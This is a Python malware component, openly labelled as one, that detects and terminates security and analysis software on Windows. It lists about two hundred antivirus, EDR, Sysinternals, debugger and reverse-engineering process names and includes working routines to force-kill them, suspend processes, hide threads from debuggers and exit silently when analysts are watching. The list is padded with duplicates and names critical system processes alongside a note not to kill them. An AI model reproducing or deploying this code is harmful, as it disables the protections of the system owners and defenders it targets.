#!/usr/bin/env python3
"""
Process monitoring and manipulation module.
Detects and kills security/analysis tools.
"""

import ctypes
import os
import subprocess
import sys
import time
from typing import List, Optional, Set


class ProcessMonitor:
    """
    Monitor running processes and detect analysis tools.
    """

    def __init__(self):
        self.is_windows = os.name == 'nt'

        # Security tools to detect and optionally terminate
        self.security_tools = [
            "MsMpEng.exe",  # Windows Defender
            "MpCmdRun.exe",
            "MpUXSrv.exe",
            "NisSrv.exe",
            "NisExe.exe",
            "MsSense.exe",  # Windows Defender ATP
            "SenseIR.exe",
            "SenseCE.exe",
            "SecurityHealthService.exe",
            "SecurityHealthSystray.exe",
            "WindowsDefenderService.exe",
            "MSASCui.exe",
            "MSASCuiL.exe",
            "MpMsTele.exe",
            "CCleaner.exe",
            "CCleaner64.exe",
            "AvastSvc.exe",
            "AvastUI.exe",
            "AvastBrowser.exe",
            "avast.exe",
            "avg.exe",
            "avgsvc.exe",
            "avgui.exe",
            "avgsvca.exe",
            "avgnsa.exe",
            "avgemca.exe",
            "mcshield.exe",
            "mcupdate.exe",
            "mcupdater.exe",
            "mfeann.exe",
            "mcafeefire.exe",
            "mcafee.exe",
            "mcvsshld.exe",
            "mfeavfk.exe",
            "mfehidk.exe",
            "mfevtps.exe",
            "mcapexe.exe",
            "mcshield.exe",
            "mcods.exe",
            "mcuihost.exe",
            "mpfagent.exe",
            "mpfconsole.exe",
            "mpfsrv.exe",
            "egui.exe",
            "ekrn.exe",
            "eamservice.exe",
            "kaspersky.exe",
            "avp.exe",
            "avpui.exe",
            "klnagent.exe",
            "vapm.exe",
            "kavfs.exe",
            "kis.exe",
            "ksde.exe",
            "ksdeui.exe",
            "bdagent.exe",
            "bdss.exe",
            "bdredline.exe",
            "bdservicehost.exe",
            "bdsubwiz.exe",
            "bdtaskhost.exe",
            "bdwtxag.exe",
            "vsserv.exe",
            "vsservppl.exe",
            "uihost.exe",
            "updatesrv.exe",
            "psi_tray.exe",
            "psi_service.exe",
            "savservice.exe",
            "savadmin.exe",
            "savmain.exe",
            "savproxy.exe",
            "swc_service.exe",
            "swi_service.exe",
            "sophosav.exe",
            "sophosnt.exe",
            "sophossps.exe",
            "sophosui.exe",
            "sophoshealth.exe",
            "sophosfimservice.exe",
            "fsav32.exe",
            "fsgk32.exe",
            "fsgk32st.exe",
            "fssm32.exe",
            "fswebuid.exe",
            "fsorsp.exe",
            "fortiedr.exe",
            "fortiedrcollector.exe",
            "fortiedrservice.exe",
            "fortescout.exe",
            "sbiesvc.exe",
            "sandboxie.exe",
            "sandboxiedcomlaunch.exe",
            "csrss.exe",  # Critical system - don't kill
            "lsass.exe",  # Critical system - don't kill
            "services.exe",  # Critical system - don't kill
            "smss.exe",  # Critical system - don't kill
            "wininit.exe",  # Critical system - don't kill
            "winlogon.exe",  # Critical system - don't kill
            "taskeng.exe",
            "taskhost.exe",
            "taskhostw.exe",
            "taskschd.exe",
            "taskmgr.exe",
            "procexp.exe",
            "procexp64.exe",
            "procmon.exe",
            "procmon64.exe",
            "tcpview.exe",
            "tcpview64.exe",
            "wireshark.exe",
            "dumpcap.exe",
            "tshark.exe",
            "capinfos.exe",
            "rawshark.exe",
            "text2pcap.exe",
            "editcap.exe",
            "reordercap.exe",
            "mergecap.exe",
            "sshd.exe",
            "ssh.exe",
            "snmp.exe",
            "snmptrap.exe",
            "regedit.exe",
            "regedt32.exe",
            "autoruns.exe",
            "autorunsc.exe",
            "sigcheck.exe",
            "streams.exe",
            "accesschk.exe",
            "accessenum.exe",
            "diskmon.exe",
            "dbgview.exe",
            "logonsessions.exe",
            "pstools.exe",
            "pslist.exe",
            "psloggedon.exe",
            "psexec.exe",
            "psfile.exe",
            "psgetsid.exe",
            "psinfo.exe",
            "pskill.exe",
            "psloglist.exe",
            "pspasswd.exe",
            "psservice.exe",
            "psshutdown.exe",
            "pssuspend.exe",
            "tcpvcon.exe",
            "portmon.exe",
            "rammap.exe",
            "vmmap.exe",
            "zoomit.exe",
            "desktops.exe",
            "contig.exe",
            "pendmoves.exe",
            "movefile.exe",
            "findlinks.exe",
            "junction.exe",
            "ldmdump.exe",
            "listdlls.exe",
            "livekd.exe",
            "loadord.exe",
            "loadordc.exe",
            "pendmoves.exe",
            "pipelist.exe",
            "portmon.exe",
            "procdump.exe",
            "procexp.exe",
            "procmon.exe",
            "psexec.exe",
            "psfile.exe",
            "psgetsid.exe",
            "psinfo.exe",
            "pskill.exe",
            "pslist.exe",
            "psloggedon.exe",
            "psloglist.exe",
            "pspasswd.exe",
            "psservice.exe",
            "psshutdown.exe",
            "pssuspend.exe",
            "rammap.exe",
            "regdelnull.exe",
            "regjump.exe",
            "sdelete.exe",
            "shareenum.exe",
            "shellrunas.exe",
            "sigcheck.exe",
            "streams.exe",
            "strings.exe",
            "sync.exe",
            "tcpview.exe",
            "vmmap.exe",
            "volumeid.exe",
            "whois.exe",
            "winobj.exe",
            "accesschk.exe",
            "accessenum.exe",
            "adexplorer.exe",
            "adinsight.exe",
            "autoruns.exe",
            "autorunsc.exe",
            "clockres.exe",
            "contig.exe",
            "coreinfo.exe",
            "ctrl2cap.exe",
            "dbgview.exe",
            "desktops.exe",
            "disk2vhd.exe",
            "diskext.exe",
            "diskmon.exe",
            "diskview.exe",
            "du.exe",
            "efsdump.exe",
            "findlinks.exe",
            "handle.exe",
            "hex2dec.exe",
            "junction.exe",
            "ldmdump.exe",
            "listdlls.exe",
            "livekd.exe",
            "loadord.exe",
            "loadordc.exe",
            "logonsessions.exe",
            "movefile.exe",
            "notmyfault.exe",
            "ntfsinfo.exe",
            "pendmoves.exe",
            "pipelist.exe",
            "portmon.exe",
            "procdump.exe",
            "procexp.exe",
            "procmon.exe",
            "psexec.exe",
            "psfile.exe",
            "psgetsid.exe",
            "psinfo.exe",
            "pskill.exe",
            "pslist.exe",
            "psloggedon.exe",
            "psloglist.exe",
            "pspasswd.exe",
            "psservice.exe",
            "psshutdown.exe",
            "pssuspend.exe",
            "rammap.exe",
            "regdelnull.exe",
            "regjump.exe",
            "sdelete.exe",
            "shareenum.exe",
            "shellrunas.exe",
            "sigcheck.exe",
            "streams.exe",
            "strings.exe",
            "sync.exe",
            "sysmon.exe",
            "tcpview.exe",
            "vmmap.exe",
            "volumeid.exe",
            "whois.exe",
            "winobj.exe",
            "fiddler.exe",
            "fiddler everywhere.exe",
            "httpdebugger.exe",
            "httpdebuggerui.exe",
            "httpdebuggerSvc.exe",
            "ollydbg.exe",
            "ollydbg64.exe",
            "x32dbg.exe",
            "x64dbg.exe",
            "ida.exe",
            "ida64.exe",
            "idag.exe",
            "idag64.exe",
            "idaw.exe",
            "idaw64.exe",
            "idapython.exe",
            "windbg.exe",
            "cdb.exe",
            "ntsd.exe",
            "kd.exe",
            "immunitydebugger.exe",
            " immunity.exe",
            "radare2.exe",
            "r2.exe",
            "cutter.exe",
            "ghidra.exe",
            "ghidraSRE.exe",
            "dnspy.exe",
            "dnspy-x86.exe",
            "ilspy.exe",
            "reflexil.exe",
            "justdecompile.exe",
            "de4dot.exe",
            "detectiteasy.exe",
            "die.exe",
            "diec.exe",
            "pestudio.exe",
            "pe-bear.exe",
            "exeinfope.exe",
            "pestudio.exe",
            "scylla.exe",
            "megadumper.exe",
            "cheatengine.exe",
            "cheatengine-i386.exe",
            "cheatengine-x86_64.exe",
            "frida-server.exe",
            "frida.exe",
            "python.exe",
            "pythonw.exe",
            "pycharm.exe",
            "pycharm64.exe",
            "code.exe",
        ]

        # Critical Windows processes that should NEVER be killed
        self.critical_processes = {
            "csrss.exe",
            "lsass.exe",
            "services.exe",
            "smss.exe",
            "wininit.exe",
            "winlogon.exe",
            "system",
            "system idle process",
            "registry",
            "memory compression",
            "secure system",
        }

    def get_running_processes(self) -> List[str]:
        """Get list of running process names."""
        if not self.is_windows:
            return []

        try:
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=10
            )

            if result.returncode == 0:
                processes = []
                for line in result.stdout.splitlines():
                    parts = line.split(",")
                    if len(parts) > 0:
                        proc_name = parts[0].strip().strip('"')
                        processes.append(proc_name.lower())
                return processes

        except Exception:
            pass

        return []

    def find_security_tools(self) -> List[str]:
        """Find running security/analysis tools."""
        running = self.get_running_processes()
        found = []

        for tool in self.security_tools:
            if tool.lower() in running:
                found.append(tool)

        return found

    def is_analysis_tool_running(self) -> bool:
        """Check if any analysis tool is running."""
        return len(self.find_security_tools()) > 0

    def kill_process(self, process_name: str, force: bool = True) -> bool:
        """
        Kill a process by name.
        Returns True if successful.
        """
        # Never kill critical processes
        if process_name.lower() in self.critical_processes:
            return False

        try:
            cmd = ["taskkill"]
            if force:
                cmd.append("/F")
            cmd.extend(["/IM", process_name, "/T"])

            result = subprocess.run(
                cmd,
                capture_output=True,
                timeout=10
            )

            return result.returncode == 0

        except Exception:
            return False

    def kill_security_tools(self) -> int:
        """
        Attempt to kill all security/analysis tools.
        Returns number of processes killed.
        """
        tools = self.find_security_tools()
        killed = 0

        for tool in tools:
            if self.kill_process(tool):
                killed += 1

        return killed

    def suspend_process(self, pid: int) -> bool:
        """Suspend a process by PID."""
        if not self.is_windows:
            return False

        try:
            # NtSuspendProcess via ctypes
            ntdll = ctypes.windll.ntdll

            # Open process
            PROCESS_SUSPEND_RESUME = 0x0800
            kernel32 = ctypes.windll.kernel32

            hProcess = kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
            if hProcess == 0:
                return False

            # Suspend
            status = ntdll.NtSuspendProcess(hProcess)
            kernel32.CloseHandle(hProcess)

            return status == 0  # STATUS_SUCCESS

        except Exception:
            return False


class ProcessHider:
    """
    Hide process from task manager and process enumeration.
    """

    @staticmethod
    def hide_from_debugger():
        """Hide current thread from debugger."""
        if os.name != 'nt':
            return False

        try:
            ntdll = ctypes.windll.ntdll

            # Get current thread handle
            kernel32 = ctypes.windll.kernel32
            hThread = kernel32.GetCurrentThread()

            # ThreadHideFromDebugger = 0x11
            THREAD_HIDE_FROM_DEBUGGER = 0x11

            status = ntdll.NtSetInformationThread(
                hThread,
                THREAD_HIDE_FROM_DEBUGGER,
                None,
                0
            )

            return status == 0  # STATUS_SUCCESS

        except Exception:
            return False

    @staticmethod
    def elevate_privileges() -> bool:
        """Attempt to elevate privileges to admin."""
        if os.name != 'nt':
            return os.geteuid() == 0

        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False


def check_and_evasive_exit():
    """
    Check for analysis tools and exit if found.
    This is a soft check - just exits gracefully.
    """
    monitor = ProcessMonitor()

    if monitor.is_analysis_tool_running():
        # Exit silently
        sys.exit(0)


if __name__ == "__main__":
    print("Process Monitor Test")
    print("=" * 60)

    monitor = ProcessMonitor()

    print("\n[*] Scanning for security/analysis tools...")
    tools = monitor.find_security_tools()

    if tools:
        print(f"[!] Found {len(tools)} security/analysis tools:")
        for tool in tools:
            print(f"    - {tool}")
    else:
        print("[+] No security tools detected")

    print("\n[*] Critical processes (protected):")
    for proc in monitor.critical_processes:
        print(f"    - {proc}")
